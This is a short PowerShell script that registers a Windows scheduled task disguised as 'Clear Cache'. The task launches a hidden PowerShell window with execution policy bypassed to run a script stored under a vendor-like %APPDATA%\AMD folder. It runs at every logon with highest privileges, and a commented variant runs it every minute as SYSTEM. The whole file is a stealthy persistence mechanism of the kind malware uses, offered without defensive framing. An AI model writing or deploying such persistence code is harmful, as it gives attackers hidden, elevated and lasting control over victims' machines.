

# Define the script path dynamically using the APPDATA environment variable
$scriptPath = "$env:APPDATA\AMD\ConvertNrun.ps1"

# Define the command to execute PowerShell with the script
$command = "powershell.exe -w H -ep Bypass -File `"$scriptPath`""

# Register the scheduled task
schtasks.exe /create /tn "Clear Cache" /tr $command /sc onlogon /rl highest /f

# schtasks.exe /create /tn "Clear Cache" /tr $command /sc minute /mo 1 /ru "SYSTEM" /f /rl highest
